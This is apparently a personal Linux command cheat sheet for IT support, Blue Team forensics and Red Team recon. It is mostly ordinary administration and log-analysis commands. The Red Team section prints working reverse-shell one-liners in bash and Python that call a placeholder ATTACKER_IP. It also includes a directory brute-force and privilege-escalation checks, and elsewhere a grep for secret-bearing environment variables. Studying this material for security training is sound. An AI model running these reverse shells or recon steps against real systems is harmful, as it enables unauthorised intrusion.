---
title: "Linux Terminal Commands"
tags: [linux, terminal, bash, cli, sysadmin, it-support, blue-team, red-team, tools]
---

# Linux Terminal Commands

Reference for IT support, Blue Team analysis, and Red Team reconnaissance. Commands are grouped by context. See also: [[PowerShell Commands]].

---

## Navigation & File System

| Command | Description | Common Flags |
|---------|-------------|-------------|
| `pwd` | Print working directory | — |
| `ls` | List directory contents | `-l` long format, `-a` show hidden, `-h` human-readable sizes, `-R` recursive |
| `cd <dir>` | Change directory | `cd ..` up one, `cd -` previous dir, `cd ~` home |
| `find <path> <expr>` | Search for files | `-name`, `-type f/d`, `-mtime -1` modified last 24h, `-size +1M`, `-perm` |
| `locate <name>` | Fast file search (uses index) | `-i` case-insensitive |
| `tree` | Directory tree view | `-L 2` limit depth, `-a` include hidden |
| `du` | Disk usage of directory | `-sh` summary human-readable, `-h --max-depth=1` |
| `df` | Disk free space | `-h` human-readable, `-T` show filesystem type |

```bash
# Find all PHP files modified in the last 24 hours (webshell hunting)
find /var/www -name "*.php" -mtime -1 -ls

# Find files with SUID bit set (privilege escalation recon)
find / -perm -4000 -type f 2>/dev/null

# Find world-writable directories
find / -type d -perm -o+w 2>/dev/null

# Find files larger than 10MB
find /home -size +10M -type f 2>/dev/null
```

---

## File Operations

| Command | Description | Common Flags |
|---------|-------------|-------------|
| `cat <file>` | Print file contents | `-n` line numbers, `-A` show non-printable |
| `less <file>` | Paginated file viewer | `q` quit, `/pattern` search, `n` next match |
| `head <file>` | First lines of file | `-n 20` first 20 lines |
| `tail <file>` | Last lines of file | `-n 50` last 50 lines, `-f` follow (live) |
| `cp <src> <dst>` | Copy file/directory | `-r` recursive, `-p` preserve permissions/timestamps |
| `mv <src> <dst>` | Move or rename | — |
| `rm <file>` | Remove file | `-r` recursive, `-f` force, `-i` interactive |
| `mkdir <dir>` | Create directory | `-p` create parent dirs |
| `touch <file>` | Create empty file / update timestamp | — |
| `ln -s <target> <link>` | Create symbolic link | — |
| `chmod <perm> <file>` | Change permissions | `+x` add execute, `755`, `644`, `-R` recursive |
| `chown <user>:<group> <file>` | Change ownership | `-R` recursive |
| `stat <file>` | File metadata (timestamps, inode) | — |
| `file <file>` | Identify file type by magic bytes | — |

```bash
# Follow a log file in real time
tail -f /var/log/apache2/access.log

# Check file type regardless of extension (forensics)
file suspicious.png

# View file metadata including all timestamps
stat /var/www/html/images/shell.php

# Copy preserving all metadata (forensic copy)
cp -rp /var/log/apache2/ /tmp/evidence/
```

---

## Text Processing & Search

| Command | Description | Common Flags |
|---------|-------------|-------------|
| `grep <pattern> <file>` | Search for pattern | `-i` case-insensitive, `-r` recursive, `-n` line numbers, `-v` invert, `-E` extended regex, `-l` filenames only, `-c` count |
| `egrep` | Extended grep (same as `grep -E`) | — |
| `sed` | Stream editor (find/replace) | `'s/old/new/g'` replace all, `-i` in-place |
| `awk` | Field-based text processing | `'{print $1}'` first field, `-F:` field separator |
| `cut` | Extract columns | `-d: -f1` delimiter and field |
| `sort` | Sort lines | `-n` numeric, `-r` reverse, `-u` unique, `-k2` sort by field 2 |
| `uniq` | Filter duplicate lines | `-c` count occurrences, `-d` only duplicates |
| `wc` | Word/line/byte count | `-l` lines, `-w` words, `-c` bytes |
| `tr` | Translate/delete characters | `tr 'a-z' 'A-Z'` uppercase |
| `strings <file>` | Extract printable strings from binary | `-n 8` min length 8 |
| `xxd <file>` | Hex dump | `-l 32` first 32 bytes |

```bash
# Search Apache logs for POST requests (webshell activity)
grep "POST" /var/log/apache2/access.log | grep "200"

# Count unique IPs in access log
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head 20

# Find base64 strings in a log file
grep -E '[A-Za-z0-9+/]{40,}={0,2}' /var/log/apache2/access.log

# Extract printable strings from suspicious binary
strings -n 8 malware.bin | grep -E "(http|cmd|exec|bash)"

# Check magic bytes of a file
xxd suspicious_file | head -2

# Find all unique 404 URLs in access log
grep " 404 " /var/log/apache2/access.log | awk '{print $7}' | sort | uniq -c | sort -rn
```

---

## User & Group Management

| Command | Description | Common Flags |
|---------|-------------|-------------|
| `whoami` | Current username | — |
| `id` | Current user UID, GID, groups | — |
| `who` | Currently logged-in users | — |
| `w` | Logged-in users + activity | — |
| `last` | Login history | `-n 20` last 20, `-F` full timestamps |
| `lastlog` | Last login per user | — |
| `useradd <user>` | Create user | `-m` create home, `-s /bin/bash` set shell, `-G` add groups |
| `usermod <user>` | Modify user | `-aG sudo` add to sudo group, `-L` lock account |
| `userdel <user>` | Delete user | `-r` remove home dir |
| `passwd <user>` | Change password | `-l` lock, `-u` unlock |
| `groupadd / groupdel` | Add/remove groups | — |
| `su <user>` | Switch user | `-` full login shell |
| `sudo <cmd>` | Run as root | `-l` list allowed commands, `-u <user>` run as user |
| `visudo` | Edit sudoers file safely | — |

```bash
# Check which users have a login shell (recon / persistence check)
grep -v '/nologin\|/false' /etc/passwd

# Check sudo privileges
sudo -l

# Check for recently created users
awk -F: '{print $1, $3}' /etc/passwd | sort -k2 -n | tail 10

# Check users with UID 0 (root-level accounts)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# View login history with timestamps
last -F -n 30
```

---

## Process Management

| Command | Description | Common Flags |
|---------|-------------|-------------|
| `ps` | Snapshot of running processes | `aux` all processes with user/CPU/mem, `-ef` full format |
| `top` | Live process monitor | `q` quit, `k` kill, `M` sort by memory |
| `htop` | Enhanced top (if installed) | — |
| `pgrep <name>` | Find PID by process name | `-l` show names |
| `kill <PID>` | Send signal to process | `-9` SIGKILL (force), `-15` SIGTERM (graceful) |
| `pkill <name>` | Kill by process name | — |
| `nice / renice` | Set process priority | `-n 10` low priority |
| `jobs` | List background jobs | — |
| `bg / fg` | Background / foreground job | — |
| `nohup <cmd> &` | Run command immune to hangup | — |
| `lsof` | List open files/sockets | `-p <PID>` by process, `-i` network connections, `-u <user>` by user |
| `strace <cmd>` | Trace system calls | `-p <PID>` attach to running process |

```bash
# Show all processes with full command line (malware recon)
ps aux --forest

# Find processes listening on network (pivot recon)
ps aux | grep -E "(nc|ncat|socat|python|perl|ruby)"

# List all open network connections by process
lsof -i -n -P

# Check what files a suspicious process has open
lsof -p 1337

# Find processes running as root
ps aux | awk '$1 == "root" {print}'
```

---

## Network

| Command | Description | Common Flags |
|---------|-------------|-------------|
| `ip a` | Show network interfaces and IPs | — |
| `ip r` | Show routing table | — |
| `ip neigh` | ARP table (neighbor cache) | — |
| `ifconfig` | Legacy interface info | — |
| `ss` | Socket statistics (modern netstat) | `-tunap` TCP/UDP/numeric/all/process, `-l` listening only |
| `netstat` | Legacy socket stats | `-tunap`, `-rn` routing table |
| `ping <host>` | ICMP reachability test | `-c 4` count, `-i 0.2` interval |
| `traceroute <host>` | Trace network path | — |
| `nslookup / dig` | DNS lookup | `dig +short`, `dig MX`, `dig @8.8.8.8` |
| `host <domain>` | Simple DNS lookup | — |
| `curl <url>` | HTTP client | `-I` headers only, `-s` silent, `-o` output file, `-L` follow redirects, `-u user:pass` |
| `wget <url>` | Download file | `-q` quiet, `-O <file>` output name, `-r` recursive |
| `nc / ncat` | Netcat – TCP/UDP Swiss Army knife | `-l` listen, `-p` port, `-v` verbose, `-e` execute |
| `tcpdump` | Capture network traffic | `-i eth0`, `-n` no DNS, `-w file.pcap`, `port 80`, `host 10.0.0.1` |
| `nmap` | Network/port scanner | `-sV` version, `-sC` scripts, `-O` OS, `-p-` all ports, `-A` aggressive |
| `arp` | View/modify ARP cache | `-a` all entries |
| `whois <domain>` | Domain registration info | — |

```bash
# Show all listening services with PID (IT support / recon)
ss -tunap | grep LISTEN

# Check active connections (C2 detection)
ss -tunap | grep ESTABLISHED

# Capture HTTP traffic to file
sudo tcpdump -i eth0 -w /tmp/capture.pcap port 80

# Quick port scan
nmap -sV -sC -p 22,80,443,8080 10.10.10.10

# Full port scan (slower, thorough)
nmap -p- -T4 10.10.10.10

# DNS zone transfer attempt
dig axfr @ns1.target.com target.com

# Test if a port is open
nc -zv 10.10.10.10 22

# Download file silently
curl -s -o malware_sample.bin http://target.com/file
```

---

## System Information

| Command | Description | Common Flags |
|---------|-------------|-------------|
| `uname` | Kernel/OS information | `-a` all info, `-r` kernel version |
| `hostname` | System hostname | `-I` IP addresses |
| `uptime` | System uptime and load | — |
| `date` | Current date/time | — |
| `timedatectl` | Timezone and NTP status | — |
| `lscpu` | CPU info | — |
| `lsmem` | Memory info | — |
| `free` | RAM usage | `-h` human-readable |
| `lsblk` | Block devices (disks) | — |
| `lspci` | PCI devices | — |
| `lsusb` | USB devices | — |
| `env` | Print environment variables | — |
| `printenv <VAR>` | Print specific variable | — |
| `dmesg` | Kernel ring buffer (boot/hardware logs) | `--follow` live, `-T` human timestamps |
| `lsmod` | Loaded kernel modules | — |
| `modinfo <mod>` | Kernel module info | — |

```bash
# Full OS and kernel version (enumeration)
uname -a && cat /etc/os-release

# Check for interesting environment variables (creds, tokens)
env | grep -iE "(pass|key|token|secret|api)"

# Check recently loaded kernel modules (rootkit detection)
lsmod | sort

# Kernel messages for hardware/driver issues
dmesg -T | tail -50
```

---

## Log Analysis

| Command / Path | Description |
|----------------|-------------|
| `/var/log/syslog` | General system log (Debian/Ubuntu) |
| `/var/log/messages` | General system log (RHEL/CentOS) |
| `/var/log/auth.log` | Authentication events (SSH, sudo, su) |
| `/var/log/secure` | Auth log on RHEL/CentOS |
| `/var/log/apache2/access.log` | Apache HTTP access log |
| `/var/log/apache2/error.log` | Apache error log |
| `/var/log/nginx/access.log` | Nginx access log |
| `/var/log/fail2ban.log` | Fail2ban blocked IPs |
| `/var/log/kern.log` | Kernel events |
| `/var/log/cron` | Cron job execution log |
| `journalctl` | Systemd journal | `-u <service>` by service, `-f` follow, `--since "1 hour ago"`, `-p err` errors only |

```bash
# Live auth log monitoring (detect brute force)
tail -f /var/log/auth.log

# Failed SSH login attempts
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Successful SSH logins
grep "Accepted password\|Accepted publickey" /var/log/auth.log

# Sudo usage history
grep "sudo" /var/log/auth.log

# Apache: requests returning 200 to suspicious paths
grep " 200 " /var/log/apache2/access.log | grep -E "(\.php|cmd|shell|upload)"

# All errors from a service since yesterday
journalctl -u nginx --since yesterday -p err
```

---

## Services & Scheduling

| Command | Description | Common Flags |
|---------|-------------|-------------|
| `systemctl status <svc>` | Service status | — |
| `systemctl start/stop/restart <svc>` | Manage service | — |
| `systemctl enable/disable <svc>` | Auto-start on boot | — |
| `systemctl list-units --type=service` | All services | `--state=running` |
| `service <svc> status` | Legacy service management | — |
| `crontab -l` | List cron jobs (current user) | `-u <user>` specific user |
| `crontab -e` | Edit cron jobs | — |
| `cat /etc/crontab` | System-wide cron jobs | — |
| `ls /etc/cron.*` | Cron directories | — |
| `at` | Schedule one-time job | — |

```bash
# Check all running services
systemctl list-units --type=service --state=running

# Check for suspicious cron jobs (persistence)
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done

# All system cron locations
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/

# Check systemd timers (modern cron alternative)
systemctl list-timers
```

---

## Package Management

| Distro | Install | Update | Remove | Search |
|--------|---------|--------|--------|--------|
| Debian/Ubuntu | `apt install <pkg>` | `apt update && apt upgrade` | `apt remove <pkg>` | `apt search <pkg>` |
| RHEL/CentOS | `yum install <pkg>` | `yum update` | `yum remove <pkg>` | `yum search <pkg>` |
| Arch | `pacman -S <pkg>` | `pacman -Syu` | `pacman -R <pkg>` | `pacman -Ss <pkg>` |

```bash
# Check installed version of a package
dpkg -l | grep openssh

# List all installed packages (enumeration)
dpkg --get-selections | grep -v deinstall

# Check if a specific tool is installed and where
which nmap && nmap --version
```

---

## Permissions & File Integrity

```bash
# Full permission breakdown
ls -la /etc/passwd /etc/shadow /etc/sudoers

# Find recently modified files in /etc (config tampering)
find /etc -mtime -1 -type f 2>/dev/null

# Find recently modified files anywhere (post-compromise)
find / -mtime -1 -type f 2>/dev/null | grep -v proc

# Check SUID/SGID binaries (privilege escalation vectors)
find / -perm /6000 -type f 2>/dev/null

# Compare current binary hash against known good
sha256sum /usr/bin/sudo
md5sum /bin/bash

# Check for world-writable files
find / -perm -o+w -type f 2>/dev/null | grep -v proc
```

---

## Hashing & Encoding

| Command | Description | Example |
|---------|-------------|---------|
| `md5sum <file>` | MD5 hash | `md5sum malware.bin` |
| `sha256sum <file>` | SHA-256 hash | `sha256sum file.zip` |
| `sha1sum <file>` | SHA-1 hash | — |
| `base64 <file>` | Base64 encode | `base64 -d` to decode |
| `echo "text" \| base64` | Encode string | — |
| `echo "dGVzdA==" \| base64 -d` | Decode base64 string | — |
| `openssl` | Crypto Swiss Army knife | `openssl s_client -connect host:443` |

```bash
# Decode base64 payload from log
echo "dGVzdGNtZA==" | base64 -d

# Hash a file for IOC comparison
sha256sum suspicious.exe

# Check TLS certificate of a host
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text
```

---

## Archiving & Compression

| Command | Description | Common Flags |
|---------|-------------|-------------|
| `tar` | Archive tool | `-czf` create gzip, `-xzf` extract gzip, `-tf` list contents, `-v` verbose |
| `zip / unzip` | ZIP archives | `unzip -l` list, `unzip -P pass` with password |
| `gzip / gunzip` | Gzip compression | — |
| `7z` | 7-Zip | `7z l` list, `7z x` extract, `7z e -p<pass>` with password |

```bash
# Create compressed archive
tar -czf evidence.tar.gz /var/log/apache2/

# Extract archive preserving permissions
tar -xzf backup.tar.gz -C /tmp/

# List contents without extracting
tar -tf archive.tar.gz

# Extract password-protected ZIP
unzip -P 'avengers' secret.zip
```

---

## Redirection & Pipes

| Syntax | Description |
|--------|-------------|
| `cmd > file` | Redirect stdout to file (overwrite) |
| `cmd >> file` | Redirect stdout to file (append) |
| `cmd 2> file` | Redirect stderr to file |
| `cmd 2>/dev/null` | Discard errors |
| `cmd &> file` | Redirect both stdout and stderr |
| `cmd1 \| cmd2` | Pipe stdout of cmd1 to cmd2 |
| `cmd \| tee file` | Output to both stdout and file |
| `cmd1 && cmd2` | Run cmd2 only if cmd1 succeeds |
| `cmd1 \|\| cmd2` | Run cmd2 only if cmd1 fails |
| `$(cmd)` | Command substitution |
| `<(cmd)` | Process substitution (treat output as file) |

---

## Scripting Essentials

```bash
#!/bin/bash

# Variables
TARGET="10.10.10.10"
OUTPUT_DIR="/tmp/recon_$(date +%Y%m%d)"

# Conditionals
if [ -f "/etc/passwd" ]; then
    echo "File exists"
fi

# Loops
for ip in $(seq 1 254); do
    ping -c 1 -W 1 192.168.1.$ip &>/dev/null && echo "192.168.1.$ip is up"
done

# Read file line by line
while IFS= read -r line; do
    echo "Processing: $line"
done < targets.txt

# Functions
check_port() {
    nc -zv "$1" "$2" 2>&1
}
check_port 10.10.10.10 22

# Error handling
set -e          # exit on error
set -u          # treat unset variables as errors
set -o pipefail # pipe fails if any command fails
```

---

## Quick Reference: IT Support Scenarios

```bash
# --- Disk full alert ---
df -h                                      # which partition is full
du -sh /* 2>/dev/null | sort -rh | head 10 # largest top-level dirs
find / -size +500M -type f 2>/dev/null     # large files

# --- Service not responding ---
systemctl status nginx
journalctl -u nginx -n 100 --no-pager
ss -tunap | grep :80

# --- High CPU / memory ---
top -bn1 | head 20
ps aux --sort=-%cpu | head 10
ps aux --sort=-%mem | head 10

# --- User locked out ---
faillock --user username              # check failed attempts
faillock --reset --user username      # reset lockout
passwd -u username                    # unlock password

# --- Check open ports ---
ss -tunap | grep LISTEN
nmap -sV localhost
```

---

## Quick Reference: Blue Team / Forensics

```bash
# --- Initial triage on compromised host ---
date && uptime && who
last -F -n 20
ps aux --forest
ss -tunap | grep ESTABLISHED
find /tmp /var/tmp /dev/shm -type f 2>/dev/null
find / -mtime -1 -name "*.php" 2>/dev/null
crontab -l; ls /etc/cron.d/
grep "sudo\|su\b" /var/log/auth.log | tail 30

# --- Webshell hunting ---
find /var/www -name "*.php" -mtime -7 | xargs grep -l "system\|exec\|passthru\|shell_exec\|base64_decode"
grep -r "base64_decode\|system(" /var/www/html/ --include="*.php"

# --- IOC search: known malicious IP ---
grep "10.10.10.99" /var/log/apache2/access.log
grep "10.10.10.99" /var/log/auth.log
ss -tunap | grep "10.10.10.99"
```

---

## Quick Reference: Red Team / Recon

```bash
# --- Host discovery ---
nmap -sn 10.10.10.0/24                  # ping sweep
for ip in $(seq 1 254); do ping -c1 -W1 10.10.10.$ip &>/dev/null && echo "10.10.10.$ip up"; done &

# --- Port & service scan ---
nmap -sV -sC -p- -T4 10.10.10.10 -oN scan.txt

# --- Web directory brute force ---
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.10/FUZZ -mc 200,301

# --- Reverse shell (catch with nc -nlvp 4444) ---
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# --- Stabilise shell ---
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm

# --- Privilege escalation quick checks ---
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab && ls /etc/cron.*
env
cat /etc/passwd | grep -v nologin
ls -la /home/*/
```

---

## Related

- [[PowerShell Commands]] – Windows equivalent for IT support and security tasks
- [[ffuf Cheat Sheet]] – Web directory and parameter fuzzing
- [[Snort]] – Network intrusion detection, rule writing

---

## References

- [GNU Coreutils Documentation](https://www.gnu.org/software/coreutils/manual/)
- [SS64 Linux Reference](https://ss64.com/bash/)
- [The Linux Command Line (book)](https://linuxcommand.org/tlcl.php)
- [GTFOBins – Unix binaries for privilege escalation](https://gtfobins.github.io)
- [LOLBAS / Linux counterpart](https://gtfobins.github.io)
